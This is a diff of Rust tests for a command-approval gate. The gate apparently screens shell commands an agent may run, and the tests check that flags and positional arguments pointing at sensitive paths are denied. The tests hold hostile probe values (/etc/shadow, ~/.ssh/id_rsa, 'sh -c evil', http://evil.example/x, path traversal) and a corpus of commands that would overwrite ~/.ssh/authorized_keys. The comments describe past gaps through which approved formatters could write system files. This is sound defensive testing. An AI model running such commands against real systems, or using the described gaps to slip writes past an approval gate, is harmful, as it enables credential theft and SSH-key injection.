+            Role::Write => crate::engine::resolve::write_target_verdict,
+            Role::Exec => crate::engine::resolve::execute_file_verdict,
+        };
+        for value in VALUES {
+            let judged_denied = judge(value) == crate::verdict::Verdict::Denied;
+            let toks: Vec<_> = [cmd.as_str(), flag.as_str(), value].iter().map(|s| crate::parse::Token::from_test(s)).collect();
+            let gate_denied = crate::pathgate::should_deny(&cmd, &toks);
+            checked += 1;
+            // Only the fail-OPEN direction is a defect. A gate that denies MORE than the judge
+            // is a different flag's rule firing on the same tokens, which is not this bug.
+            if judged_denied && !gate_denied {
+                failures.push(format!("  {cmd} `{flag}` ({role:?}): the judge refuses {value:?} but the gate never asked"));
             }
         }
+    }
+    assert!(checked > 500, "only {checked} gate/value pairs probed — the sweep is wrong");
+    assert!(
+        failures.is_empty(),
+        "the pre-filter skipped values their own gate would have refused ({} of {checked}):\n{}",
+        failures.len(),
+        failures.join("\n")
+    );
+}
 
-        // Deliberately mixed: paths that look like paths, and values that do not. The second group
-        // is the point — every historical miss lived there.
-        const VALUES: &[&str] = &[
-            "/etc/shadow",
-            "~/.ssh/id_rsa",
-            "/tmp/sc-probe/x",
-            "./ok.txt",
-            "out.txt",
-            "sh -c evil",
-            "ssh -p 2222",
-            "file:~",
-            "fiLe:~",
-            "abc:~",
-            "x:/tmp/evil",
-            "http://evil.example/x",
-            "https://evil.example/x",
-            "ssh://evil/x",
-            "*.sh",
-            "$VAR",
-            "-",
-            "../../etc/shadow",
-        ];
+/// Behavioral conservation: every path-flag DECLARED in a gate (central `[roles.X]` or a
+/// command's own `[command.path_gate]`) must ACTUALLY deny a hot path. Catches a gate that is
+/// shadowed (a central `[roles.X]` hid a co-located flag — the qpdf bug), mis-spelled (a
+/// single-dash Go flag the double-dash gate missed — the mkcert bug), or otherwise non-firing.
+/// Operates on `should_deny` directly, so command usage-validation can't hand it a false pass.
+#[test]
+fn every_declared_path_flag_actually_gates() {
+    use super::types::TomlFile;
+    use crate::pathgate::Role;
 
-        let mut gates: Vec<(String, String, Role)> = crate::pathgate::central_flag_gates();
-        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
-        let mut files = Vec::new();
-        toml_files(&root, &mut files);
-        for file in &files {
-            let src = std::fs::read_to_string(file).unwrap();
-            let parsed: TomlFile = toml::from_str(&src).unwrap();
-            for cmd in &parsed.command {
-                if let Some(pg) = &cmd.path_gate {
-                    for (f, r) in pg.flag_roles() {
-                        gates.push((cmd.name.clone(), f.to_string(), r));
-                    }
-                }
+    fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
+        for e in std::fs::read_dir(dir).unwrap() {
+            let p = e.unwrap().path();
+            if p.is_dir() {
+                toml_files(&p, out);
+            } else if p.extension().is_some_and(|x| x == "toml") {
+                out.push(p);
             }
         }
-
-        let mut failures = Vec::new();
-        let mut checked = 0usize;
-        for (cmd, flag, role) in gates {
-            let judge = match role {
-                Role::Ignore => continue,
-                Role::Read => crate::engine::resolve::read_content_verdict,
-                Role::ReadTree => crate::engine::resolve::read_tree_verdict,
-                Role::Write => crate::engine::resolve::write_target_verdict,
-                Role::Exec => crate::engine::resolve::execute_file_verdict,
-            };
-            for value in VALUES {
-                let judged_denied = judge(value) == crate::verdict::Verdict::Denied;
-                let toks: Vec<_> = [cmd.as_str(), flag.as_str(), value]
-                    .iter()
-                    .map(|s| crate::parse::Token::from_test(s))
-                    .collect();
-                let gate_denied = crate::pathgate::should_deny(&cmd, &toks);
-                checked += 1;
-                // Only the fail-OPEN direction is a defect. A gate that denies MORE than the judge
-                // is a different flag's rule firing on the same tokens, which is not this bug.
-                if judged_denied && !gate_denied {
-                    failures.push(format!(
-                        "  {cmd} `{flag}` ({role:?}): the judge refuses {value:?} but the gate never asked"
-                    ));
-                }
-            }
-        }
-        assert!(checked > 500, "only {checked} gate/value pairs probed — the sweep is wrong");
-        assert!(
-            failures.is_empty(),
-            "the pre-filter skipped values their own gate would have refused ({} of {checked}):\n{}",
-            failures.len(),
-            failures.join("\n")
-        );
     }
 
-    /// Behavioral conservation: every path-flag DECLARED in a gate (central `[roles.X]` or a
-    /// command's own `[command.path_gate]`) must ACTUALLY deny a hot path. Catches a gate that is
-    /// shadowed (a central `[roles.X]` hid a co-located flag — the qpdf bug), mis-spelled (a
-    /// single-dash Go flag the double-dash gate missed — the mkcert bug), or otherwise non-firing.
-    /// Operates on `should_deny` directly, so command usage-validation can't hand it a false pass.
-    #[test]
-    fn every_declared_path_flag_actually_gates() {
-        use super::types::TomlFile;
-        use crate::pathgate::Role;
-
-        fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
-            for e in std::fs::read_dir(dir).unwrap() {
-                let p = e.unwrap().path();
-                if p.is_dir() {
-                    toml_files(&p, out);
-                } else if p.extension().is_some_and(|x| x == "toml") {
-                    out.push(p);
+    let mut gates: Vec<(String, String, Role)> = crate::pathgate::central_flag_gates();
+    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
+    let mut files = Vec::new();
+    toml_files(&root, &mut files);
+    for file in &files {
+        let src = std::fs::read_to_string(file).unwrap();
+        let parsed: TomlFile = toml::from_str(&src).unwrap();
+        for cmd in &parsed.command {
+            if let Some(pg) = &cmd.path_gate {
+                for (f, r) in pg.flag_roles() {
+                    gates.push((cmd.name.clone(), f.to_string(), r));
                 }
             }
         }
-
-        let mut gates: Vec<(String, String, Role)> = crate::pathgate::central_flag_gates();
-        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
-        let mut files = Vec::new();
-        toml_files(&root, &mut files);
-        for file in &files {
-            let src = std::fs::read_to_string(file).unwrap();
-            let parsed: TomlFile = toml::from_str(&src).unwrap();
-            for cmd in &parsed.command {
-                if let Some(pg) = &cmd.path_gate {
-                    for (f, r) in pg.flag_roles() {
-                        gates.push((cmd.name.clone(), f.to_string(), r));
-                    }
-                }
-            }
-        }
-
-        let mut failures = Vec::new();
-        for (cmd, flag, role) in gates {
-            let hot = match role {
-                Role::Write => "/etc/sc-probe-target",
-                Role::Read => "~/.ssh/id_rsa",
-                Role::ReadTree => "~/.ssh/id_rsa",
-                // A /tmp executor is the discriminating hot path: `write` would ALLOW it
-                // (Temp is writable), but `exec` must DENY it (running staged/foreign code).
-                Role::Exec => "/tmp/sc-probe/Cargo.toml",
-                Role::Ignore => continue,
-            };
-            // Probe the space form (`flag hot`) AND the `flag=hot` glued form. A path-flag must
-            // gate its value in EVERY spelling; the glued form is where single-dash-long flags
-            // (Go-flag tools like terraform's `-out=…`) previously slipped the gate.
-            let forms = [
-                vec![cmd.clone(), flag.clone(), hot.to_string()],
-                vec![cmd.clone(), format!("{flag}={hot}")],
-            ];
-            for form in forms {
-                let toks: Vec<_> = form.iter().map(|s| crate::parse::Token::from_test(s)).collect();
-                if !crate::pathgate::should_deny(&cmd, &toks) {
-                    failures.push(format!("  {cmd} `{flag}` ({role:?}) did NOT deny {hot} — form {form:?}"));
-                }
-            }
-        }
-        assert!(
-            failures.is_empty(),
-            "declared path-flag gates that don't actually fire (shadowed / mis-spelled / wrong):\n{}",
-            failures.join("\n")
-        );
     }
 
-    /// SWEEP DRIVER + regression ratchet for the ambiguous-output-flag WRITE hole. A valued flag like
-    /// `-o`/`--output`/`-d`/`--write` that is a WRITE PATH (`asciidoctor -o`, `dot -o`, `gs -o`) but is
-    /// NOT a declared path-gate lets an auto-approved command overwrite `~/.ssh/authorized_keys` /
-    /// `.git/hooks/*` — SSH-key / shell-code injection at the default band. The
-    /// `every_unambiguous_path_flag_declares_a_role` guard deliberately SKIPS these names ("usually a
-    /// format, not a path"), which is wrong for the doc/image/diagram/build-tool class.
-    ///
-    /// Behavioral: for every top-level command declaring one of these flags, `<cmd> <flag>
-    /// ~/.ssh/authorized_keys` must NOT auto-approve — either the flag GATES the path (a real writer →
-    /// add `[command.path_gate]` write role) or it is GRANDFATHERED (a verified format-only flag,
-    /// `-o json`, whose value is an enum not a path — a harmless permanent exemption). The grandfather
-    /// set only SHRINKS as the sweep gates the real writers; a NEW output-flag command that
-    /// auto-approves a sensitive write fails until resolved. Directly tests the security property, so a
-    /// gated flag flips it green — the sweep's per-command confirmation.
-    #[test]
-    fn ambiguous_output_flags_do_not_write_sensitive_paths() {
-        use super::types::TomlFile;
-        const OUTPUT_FLAGS: &[&str] = &[
-            "-o", "--output", "--out", "--outfile", "--write", "--replace-input", "output",
-            // unambiguous output-DIRECTORY / output-path flags (low noise — these are paths, not
-            // formats): a build tool / bundler / generator writes its artifacts to this dir.
-            "--outdir", "--out-dir", "--outDir", "--target-dir", "--site-dir", "--output-dir",
-            "--output-path", "--destination", "--dest",
-        ];
-        const SENSITIVE: &str = "~/.ssh/authorized_keys"; // user-writable, compromise-grade
-        // The acknowledged worklist (shrinks only). A tab-separated `<command>\t<flag>` per row.
-        let worklist: std::collections::HashSet<(String, String)> =
-            include_str!("../../tests/fixtures/output_flag_worklist.tsv")
-                .lines()
-                .filter(|l| !l.trim().is_empty() && !l.starts_with('#'))
-                .filter_map(|l| l.split_once('\t').map(|(c, f)| (c.to_string(), f.to_string())))
+    let mut failures = Vec::new();
+    for (cmd, flag, role) in gates {
+        let hot = match role {
+            Role::Write => "/etc/sc-probe-target",
+            Role::Read => "~/.ssh/id_rsa",
+            Role::ReadTree => "~/.ssh/id_rsa",
+            // A /tmp executor is the discriminating hot path: `write` would ALLOW it
+            // (Temp is writable), but `exec` must DENY it (running staged/foreign code).
+            Role::Exec => "/tmp/sc-probe/Cargo.toml",
+            Role::Ignore => continue,
+        };
+        // Probe the space form (`flag hot`) AND the `flag=hot` glued form. A path-flag must
+        // gate its value in EVERY spelling; the glued form is where single-dash-long flags
+        // (Go-flag tools like terraform's `-out=…`) previously slipped the gate.
+        let forms = [vec![cmd.clone(), flag.clone(), hot.to_string()], vec![cmd.clone(), format!("{flag}={hot}")]];
+        for form in forms {
+            let toks: Vec<_> = form.iter().map(|s| crate::parse::Token::from_test(s)).collect();
+            if !crate::pathgate::should_deny(&cmd, &toks) {
+                failures.push(format!("  {cmd} `{flag}` ({role:?}) did NOT deny {hot} — form {form:?}"));
+            }
+        }
+    }
+    assert!(
+        failures.is_empty(),
+        "declared path-flag gates that don't actually fire (shadowed / mis-spelled / wrong):\n{}",
+        failures.join("\n")
+    );
+}
+
+/// SWEEP DRIVER + regression ratchet for the ambiguous-output-flag WRITE hole. A valued flag like
+/// `-o`/`--output`/`-d`/`--write` that is a WRITE PATH (`asciidoctor -o`, `dot -o`, `gs -o`) but is
+/// NOT a declared path-gate lets an auto-approved command overwrite `~/.ssh/authorized_keys` /
+/// `.git/hooks/*` — SSH-key / shell-code injection at the default band. The
+/// `every_unambiguous_path_flag_declares_a_role` guard deliberately SKIPS these names ("usually a
+/// format, not a path"), which is wrong for the doc/image/diagram/build-tool class.
+///
+/// Behavioral: for every top-level command declaring one of these flags, `<cmd> <flag>
+/// ~/.ssh/authorized_keys` must NOT auto-approve — either the flag GATES the path (a real writer →
+/// add `[command.path_gate]` write role) or it is GRANDFATHERED (a verified format-only flag,
+/// `-o json`, whose value is an enum not a path — a harmless permanent exemption). The grandfather
+/// set only SHRINKS as the sweep gates the real writers; a NEW output-flag command that
+/// auto-approves a sensitive write fails until resolved. Directly tests the security property, so a
+/// gated flag flips it green — the sweep's per-command confirmation.
+#[test]
+fn ambiguous_output_flags_do_not_write_sensitive_paths() {
+    use super::types::TomlFile;
+    const OUTPUT_FLAGS: &[&str] = &[
+        "-o", "--output", "--out", "--outfile", "--write", "--replace-input", "output",
+        // unambiguous output-DIRECTORY / output-path flags (low noise — these are paths, not
+        // formats): a build tool / bundler / generator writes its artifacts to this dir.
+        "--outdir", "--out-dir", "--outDir", "--target-dir", "--site-dir", "--output-dir", "--output-path", "--destination", "--dest",
+    ];
+    const SENSITIVE: &str = "~/.ssh/authorized_keys"; // user-writable, compromise-grade
+    // The acknowledged worklist (shrinks only). A tab-separated `<command>\t<flag>` per row.
+    let worklist: std::collections::HashSet<(String, String)> = include_str!("../../tests/fixtures/output_flag_worklist.tsv")
+        .lines()
+        .filter(|l| !l.trim().is_empty() && !l.starts_with('#'))
+        .filter_map(|l| l.split_once('\t').map(|(c, f)| (c.to_string(), f.to_string())))
+        .collect();
+
+    fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
+        for e in std::fs::read_dir(dir).unwrap() {
+            let p = e.unwrap().path();
+            if p.is_dir() {
+                toml_files(&p, out);
+            } else if p.extension().is_some_and(|x| x == "toml") {
+                out.push(p);
+            }
+        }
+    }
+
+    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
+    let mut files = Vec::new();
+    toml_files(&root, &mut files);
+    let mut holes = std::collections::HashSet::new();
+    for file in &files {
+        let src = std::fs::read_to_string(file).unwrap();
+        let parsed: TomlFile = toml::from_str(&src).unwrap();
+        for cmd in &parsed.command {
+            // Two sources, and the second is the one that matters. OUTPUT_FLAGS is a NAME
+            // heuristic, so it only ever finds flags someone thought to list: it misses `-i`,
+            // `-w`, `--in-place`, `--fix` — the in-place formatters and autofixers, which are
+            // the largest writer family in the tree. `write_flags` is not a heuristic at all,
+            // it is the entry's OWN declaration that this flag makes the run write, so deriving
+            // the obligation from it cannot drift from what the author claimed.
+            //
+            // Measured before this was added: 33 commands (74 flag/path pairs) declared
+            // `write_flags` and still auto-approved a system path — `clang-format -i /etc/hosts`,
+            // `gofmt -w /etc/hosts`, `yapf --in-place ~/.ssh/config`, `xattr -w … ~/.ssh/id_rsa`.
+            // `write_flags` raises the LEVEL to SafeWrite; it never gated the LOCUS, and nothing
+            // connected the two.
+            let declared: Vec<&String> = cmd
+                .valued
+                .iter()
+                .filter(|f| OUTPUT_FLAGS.contains(&f.as_str()))
+                .chain(cmd.write_flags.iter())
                 .collect();
-
-        fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
-            for e in std::fs::read_dir(dir).unwrap() {
-                let p = e.unwrap().path();
-                if p.is_dir() {
-                    toml_files(&p, out);
-                } else if p.extension().is_some_and(|x| x == "toml") {
-                    out.push(p);
+            for flag in declared {
+                if crate::is_safe_command(&format!("{} {flag} {SENSITIVE} in", cmd.name)) {
+                    holes.insert((cmd.name.clone(), flag.clone()));
                 }
             }
-        }
-
-        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
-        let mut files = Vec::new();
-        toml_files(&root, &mut files);
-        let mut holes = std::collections::HashSet::new();
-        for file in &files {
-            let src = std::fs::read_to_string(file).unwrap();
-            let parsed: TomlFile = toml::from_str(&src).unwrap();
-            for cmd in &parsed.command {
-                // Two sources, and the second is the one that matters. OUTPUT_FLAGS is a NAME
-                // heuristic, so it only ever finds flags someone thought to list: it misses `-i`,
-                // `-w`, `--in-place`, `--fix` — the in-place formatters and autofixers, which are
-                // the largest writer family in the tree. `write_flags` is not a heuristic at all,
-                // it is the entry's OWN declaration that this flag makes the run write, so deriving
-                // the obligation from it cannot drift from what the author claimed.
-                //
-                // Measured before this was added: 33 commands (74 flag/path pairs) declared
-                // `write_flags` and still auto-approved a system path — `clang-format -i /etc/hosts`,
-                // `gofmt -w /etc/hosts`, `yapf --in-place ~/.ssh/config`, `xattr -w … ~/.ssh/id_rsa`.
-                // `write_flags` raises the LEVEL to SafeWrite; it never gated the LOCUS, and nothing
-                // connected the two.
-                let declared: Vec<&String> = cmd
+            // Subs too. Restricting the walk to top-level `parsed.command` is why
+            // `vegeta report --output ~/.ssh/authorized_keys` was missed: the flag is declared
+            // on the sub, so the guard never saw it.
+            for sub in &cmd.sub {
+                let declared: Vec<&String> = sub
                     .valued
                     .iter()
                     .filter(|f| OUTPUT_FLAGS.contains(&f.as_str()))
-                    .chain(cmd.write_flags.iter())
+                    .chain(sub.write_flags.iter())
                     .collect();
                 for flag in declared {
-                    if crate::is_safe_command(&format!("{} {flag} {SENSITIVE} in", cmd.name)) {
-                        holes.insert((cmd.name.clone(), flag.clone()));
-                    }
-                }
-                // Subs too. Restricting the walk to top-level `parsed.command` is why
-                // `vegeta report --output ~/.ssh/authorized_keys` was missed: the flag is declared
-                // on the sub, so the guard never saw it.
-                for sub in &cmd.sub {
-                    let declared: Vec<&String> = sub
-                        .valued
-                        .iter()
-                        .filter(|f| OUTPUT_FLAGS.contains(&f.as_str()))
-                        .chain(sub.write_flags.iter())
-                        .collect();
-                    for flag in declared {
-                        let probe = format!("{} {} {flag} {SENSITIVE} in", cmd.name, sub.name);
-                        if crate::is_safe_command(&probe) {
-                            holes.insert((format!("{} {}", cmd.name, sub.name), flag.clone()));
-                        }
+                    let probe = format!("{} {} {flag} {SENSITIVE} in", cmd.name, sub.name);
+                    if crate::is_safe_command(&probe) {
+                        holes.insert((format!("{} {}", cmd.name, sub.name), flag.clone()));
                     }
                 }
             }
         }
-
-        // (a) A hole NOT on the worklist is a new/unacknowledged ungated write flag — fail closed.
-        let mut unlisted: Vec<_> = holes.difference(&worklist).collect();
-        unlisted.sort();
-        assert!(
-            unlisted.is_empty(),
-            "NEW ungated output-flag writes ({}) — GATE (add a `[command.path_gate]` write role) or add \
-             to tests/fixtures/output_flag_worklist.tsv with a verified format-only reason:\n{}",
-            unlisted.len(),
-            unlisted.iter().map(|(c, f)| format!("  {c} `{f}`")).collect::<Vec<_>>().join("\n"),
-        );
-        // (b) A worklist entry that is NO LONGER a hole has been gated — remove it (the fix
-        // confirmation; keeps the ratchet shrinking and the worklist honest).
-        let mut stale: Vec<_> = worklist.difference(&holes).collect();
-        stale.sort();
-        assert!(
-            stale.is_empty(),
-            "worklist entries no longer auto-approve — they are GATED now; remove them from \
-             tests/fixtures/output_flag_worklist.tsv ({} stale):\n{}",
-            stale.len(),
-            stale.iter().map(|(c, f)| format!("  {c} `{f}`")).collect::<Vec<_>>().join("\n"),
-        );
     }
 
-    /// DISCOVERY ratchet for POSITIONAL last-arg writers — the class the flag-based
-    /// `ambiguous_output_flags_do_not_write_sensitive_paths` guard cannot enumerate (a converter whose
-    /// output is the LAST positional, not a flag: `cjxl in out`, `pdfunite a b out`). Signal: probe
-    /// every command `<cmd> <benign-input> ~/.ssh/authorized_keys`. A READER of that last positional
-    /// already denies (its read-gate blocks the sensitive read), so a command that AUTO-APPROVES is
-    /// either an ungated last-positional WRITER (gate it `shape = "last_write"`) or one that ignores
-    /// the extra arg (harmless — acknowledge on the worklist).
-    ///
-    /// WHY a description heuristic, and what it does NOT promise. Behaviorally, a positional WRITER and
-    /// a command that IGNORES a trailing arg are indistinguishable — both auto-approve — so the raw
-    /// probe surfaces ~600 commands, ~99% harmless ignorers (`basename`, `date`, `bc`). The only signal
-    /// that separates them is the researched description (a writer's says it "converts/encodes/writes a
-    /// file"). So this ratchet is a best-effort DISCOVERY driver over the writer-shaped descriptions,
-    /// NOT a completeness proof: a writer whose description dodges every trigger word is missed here.
-    /// The fail-CLOSED guarantee for the writers we KNOW is the corpus test below
-    /// (`positional_and_output_dir_writers_gate_sensitive_paths`) — this test keeps NEW writer-shaped
-    /// commands from shipping ungated. The `declares_write_flag` exclusion is structural (not an `-o`
-    /// probe, which is confounded by unknown-flag denials and the `last_write` positional gate itself):
-    /// a command whose output is a declared write FLAG has input positionals, so its probe is a false
-    /// positive already covered by the flag guard; a `last_write` SHAPE declares no write flag, so
-    /// positional writers like `cjxl` are still covered.
-    #[test]
-    fn positional_last_arg_writers_are_gated_or_acknowledged() {
-        const SENSITIVE: &str = "sc-probe-in.dat ~/.ssh/authorized_keys";
-        let acknowledged: std::collections::HashSet<&str> =
-            include_str!("../../tests/fixtures/positional_writer_worklist.tsv")
-                .lines()
-                .map(|l| l.trim())
-                .filter(|l| !l.is_empty() && !l.starts_with('#'))
-                .filter_map(|l| l.split_whitespace().next())
-                .collect();
-        // A last-positional writer's researched description says it PRODUCES a file (converts/encodes/
-        // decodes/renders/writes …). Kept deliberately broad on the object side ("output"/"file"/"to
-        // …") so "writes a .jxl file" (cjxl) matches — an earlier narrow form that required "output"
-        // silently skipped it. False positives just land on the worklist; the risk is a missed writer,
-        // so err toward matching.
-        fn writes_output(d: &str) -> bool {
-            let d = d.to_ascii_lowercase();
-            let action = ["convert", "render", "encode", "decode", "transcode", "compress",
-                "writes", "produces", "emits"];
-            let object = ["output", "writes a", "writes the", "creates a", "produces a",
-                "to the file", "to a file", "to a new", "you name", "you supply",
-                "last positional", "named output"];
-            action.iter().any(|a| d.contains(a)) && object.iter().any(|o| d.contains(o))
-        }
-        let mut candidates: Vec<&str> = super::TOML_REGISTRY
-            .iter()
-            .filter(|(name, spec)| *name == &spec.name && writes_output(&spec.description))
-            .map(|(name, _)| name.as_str())
-            .filter(|name| crate::is_safe_command(&format!("{name} {SENSITIVE}")))
-            .filter(|name| !crate::pathgate::declares_write_flag(name))
-            .filter(|name| !acknowledged.contains(name))
-            .collect();
-        candidates.sort();
-        assert!(
-            candidates.is_empty(),
-            "commands auto-approving a sensitive LAST-positional write ({}) — GATE the writers \
+    // (a) A hole NOT on the worklist is a new/unacknowledged ungated write flag — fail closed.
+    let mut unlisted: Vec<_> = holes.difference(&worklist).collect();
+    unlisted.sort();
+    assert!(
+        unlisted.is_empty(),
+        "NEW ungated output-flag writes ({}) — GATE (add a `[command.path_gate]` write role) or add \
+             to tests/fixtures/output_flag_worklist.tsv with a verified format-only reason:\n{}",
+        unlisted.len(),
+        unlisted.iter().map(|(c, f)| format!("  {c} `{f}`")).collect::<Vec<_>>().join("\n"),
+    );
+    // (b) A worklist entry that is NO LONGER a hole has been gated — remove it (the fix
+    // confirmation; keeps the ratchet shrinking and the worklist honest).
+    let mut stale: Vec<_> = worklist.difference(&holes).collect();
+    stale.sort();
+    assert!(
+        stale.is_empty(),
+        "worklist entries no longer auto-approve — they are GATED now; remove them from \
+             tests/fixtures/output_flag_worklist.tsv ({} stale):\n{}",
+        stale.len(),
+        stale.iter().map(|(c, f)| format!("  {c} `{f}`")).collect::<Vec<_>>().join("\n"),
+    );
+}
+
+/// DISCOVERY ratchet for POSITIONAL last-arg writers — the class the flag-based
+/// `ambiguous_output_flags_do_not_write_sensitive_paths` guard cannot enumerate (a converter whose
+/// output is the LAST positional, not a flag: `cjxl in out`, `pdfunite a b out`). Signal: probe
+/// every command `<cmd> <benign-input> ~/.ssh/authorized_keys`. A READER of that last positional
+/// already denies (its read-gate blocks the sensitive read), so a command that AUTO-APPROVES is
+/// either an ungated last-positional WRITER (gate it `shape = "last_write"`) or one that ignores
+/// the extra arg (harmless — acknowledge on the worklist).
+///
+/// WHY a description heuristic, and what it does NOT promise. Behaviorally, a positional WRITER and
+/// a command that IGNORES a trailing arg are indistinguishable — both auto-approve — so the raw
+/// probe surfaces ~600 commands, ~99% harmless ignorers (`basename`, `date`, `bc`). The only signal
+/// that separates them is the researched description (a writer's says it "converts/encodes/writes a
+/// file"). So this ratchet is a best-effort DISCOVERY driver over the writer-shaped descriptions,
+/// NOT a completeness proof: a writer whose description dodges every trigger word is missed here.
+/// The fail-CLOSED guarantee for the writers we KNOW is the corpus test below
+/// (`positional_and_output_dir_writers_gate_sensitive_paths`) — this test keeps NEW writer-shaped
+/// commands from shipping ungated. The `declares_write_flag` exclusion is structural (not an `-o`
+/// probe, which is confounded by unknown-flag denials and the `last_write` positional gate itself):
+/// a command whose output is a declared write FLAG has input positionals, so its probe is a false
+/// positive already covered by the flag guard; a `last_write` SHAPE declares no write flag, so
+/// positional writers like `cjxl` are still covered.
+#[test]
+fn positional_last_arg_writers_are_gated_or_acknowledged() {
+    const SENSITIVE: &str = "sc-probe-in.dat ~/.ssh/authorized_keys";
+    let acknowledged: std::collections::HashSet<&str> = include_str!("../../tests/fixtures/positional_writer_worklist.tsv")
+        .lines()
+        .map(|l| l.trim())
+        .filter(|l| !l.is_empty() && !l.starts_with('#'))
+        .filter_map(|l| l.split_whitespace().next())
+        .collect();
+    // A last-positional writer's researched description says it PRODUCES a file (converts/encodes/
+    // decodes/renders/writes …). Kept deliberately broad on the object side ("output"/"file"/"to
+    // …") so "writes a .jxl file" (cjxl) matches — an earlier narrow form that required "output"
+    // silently skipped it. False positives just land on the worklist; the risk is a missed writer,
+    // so err toward matching.
+    fn writes_output(d: &str) -> bool {
+        let d = d.to_ascii_lowercase();
+        let action = ["convert", "render", "encode", "decode", "transcode", "compress", "writes", "produces", "emits"];
+        let object = [
+            "output", "writes a", "writes the", "creates a", "produces a", "to the file", "to a file", "to a new", "you name",
+            "you supply", "last positional", "named output",
+        ];
+        action.iter().any(|a| d.contains(a)) && object.iter().any(|o| d.contains(o))
+    }
+    let mut candidates: Vec<&str> = super::TOML_REGISTRY
+        .iter()
+        .filter(|(name, spec)| *name == &spec.name && writes_output(&spec.description))
+        .map(|(name, _)| name.as_str())
+        .filter(|name| crate::is_safe_command(&format!("{name} {SENSITIVE}")))
+        .filter(|name| !crate::pathgate::declares_write_flag(name))
+        .filter(|name| !acknowledged.contains(name))
+        .collect();
+    candidates.sort();
+    assert!(
+        candidates.is_empty(),
+        "commands auto-approving a sensitive LAST-positional write ({}) — GATE the writers \
              (`shape = \"last_write\"`) or add the harmless ones (ignores the arg) to \
              tests/fixtures/positional_writer_worklist.tsv:\n  {}",
-            candidates.len(),
-            candidates.join("\n  "),
-        );
-    }
+        candidates.len(),
+        candidates.join("\n  "),
+    );
+}
 
-    /// Regression corpus for the output-flag sweep's RESIDUAL classes (adversarial-review follow-ups):
-    /// positional last-arg writers (a converter whose output is the last positional, `shape =
-    /// "last_write"`) and output-DIRECTORY flags. These are NOT covered by
-    /// `every_declared_path_flag_actually_gates` (which probes only FLAG gates), so a shape gate could
-    /// silently regress. Each write of a sensitive target must deny; each benign worktree form allows.
-    #[test]
-    fn positional_and_output_dir_writers_gate_sensitive_paths() {
-        const S: &str = "~/.ssh/authorized_keys";
-        let deny = [
-            format!("pdfunite a.pdf b.pdf {S}"),
-            format!("ps2pdf in.ps {S}"),
-            format!("pdf2ps in.pdf {S}"),
-            format!("pdftops in.pdf {S}"),
-            format!("pdfcrop in.pdf {S}"),
-            format!("lame in.wav {S}"),
-            format!("cjxl in.png {S}"),
-            format!("djxl in.jxl {S}"),
-            format!("sphinx-build src {S}"),
-            format!("sphinx-build -M html src {S}"),
-            format!("weasyprint in.html {S}"),
-            format!("tiffcp in.tif {S}"),
-            format!("mkdocs build -d {S}"),
-            format!("mkdocs build --site-dir {S}"),
-            format!("gs -o {S} x.ps"),
-            // Positional last-arg writer audit (converters + in-place mutators):
-            format!("dvipdf in.dvi {S}"),
-            format!("eps2eps in.eps {S}"),
-            format!("ps2pdfwr in.ps {S}"),
-            format!("pfbtopfa in.pfb {S}"),
-            format!("tiff2bw in.tif {S}"),
-            format!("tiffcrop in.tif {S}"),
-            format!("pal2rgb in.tif {S}"),
-            format!("jpgicc in.jpg {S}"),
-            format!("tificc in.tif {S}"),
-            format!("heif-thumbnailer in.heic {S}"),
-            format!("wkhtmltopdf in.html {S}"),
-            format!("gdbm_dump db.gdbm {S}"),
-            format!("pkgbuild --root ./r {S}"),
-            // in-place mutators: sensitive as the sole/last positional …
-            format!("wasm-strip {S}"),
-            format!("llvm-strip {S}"),
-            format!("llvm-objcopy in.o {S}"),
-            format!("install_name_tool -id x {S}"),
-            format!("indent {S}"),
-            format!("PlistBuddy {S}"),
-            // … and multi-file in-place (`positional = "write"`) must gate a NON-last sensitive arg:
-            format!("nbstripout {S} ok.ipynb"),
-            format!("afscexpand {S} ./b"),
-        ];
-        for c in &deny {
-            assert!(!crate::is_safe_command(c), "must deny a sensitive write: {c}");
-        }
-        for c in [
-            "pdfunite a.pdf b.pdf ./out.pdf",
-            "sphinx-build src ./_build",
-            "weasyprint in.html ./out.pdf",
-            "tiffcp in.tif ./out.tif",
-            "mkdocs build -d ./site",
-            "gs -o ./out.pdf x.ps",
-            "dvipdf in.dvi ./out.pdf",
-            "tiff2bw in.tif ./out.tif",
-            "jpgicc in.jpg ./out.jpg",
-            "wasm-strip ./mod.wasm",
-            "nbstripout ./a.ipynb ./b.ipynb",
-        ] {
-            assert!(crate::is_safe_command(c), "benign worktree write must allow: {c}");
-        }
+/// Regression corpus for the output-flag sweep's RESIDUAL classes (adversarial-review follow-ups):
+/// positional last-arg writers (a converter whose output is the last positional, `shape =
+/// "last_write"`) and output-DIRECTORY flags. These are NOT covered by
+/// `every_declared_path_flag_actually_gates` (which probes only FLAG gates), so a shape gate could
+/// silently regress. Each write of a sensitive target must deny; each benign worktree form allows.
+#[test]
+fn positional_and_output_dir_writers_gate_sensitive_paths() {
+    const S: &str = "~/.ssh/authorized_keys";
+    let deny = [
+        format!("pdfunite a.pdf b.pdf {S}"),
+        format!("ps2pdf in.ps {S}"),
+        format!("pdf2ps in.pdf {S}"),
+        format!("pdftops in.pdf {S}"),
+        format!("pdfcrop in.pdf {S}"),
+        format!("lame in.wav {S}"),
+        format!("cjxl in.png {S}"),
+        format!("djxl in.jxl {S}"),
+        format!("sphinx-build src {S}"),
+        format!("sphinx-build -M html src {S}"),
+        format!("weasyprint in.html {S}"),
+        format!("tiffcp in.tif {S}"),
+        format!("mkdocs build -d {S}"),
+        format!("mkdocs build --site-dir {S}"),
+        format!("gs -o {S} x.ps"),
+        // Positional last-arg writer audit (converters + in-place mutators):
+        format!("dvipdf in.dvi {S}"),
+        format!("eps2eps in.eps {S}"),
+        format!("ps2pdfwr in.ps {S}"),
+        format!("pfbtopfa in.pfb {S}"),
+        format!("tiff2bw in.tif {S}"),
+        format!("tiffcrop in.tif {S}"),
+        format!("pal2rgb in.tif {S}"),
+        format!("jpgicc in.jpg {S}"),
+        format!("tificc in.tif {S}"),
+        format!("heif-thumbnailer in.heic {S}"),
+        format!("wkhtmltopdf in.html {S}"),
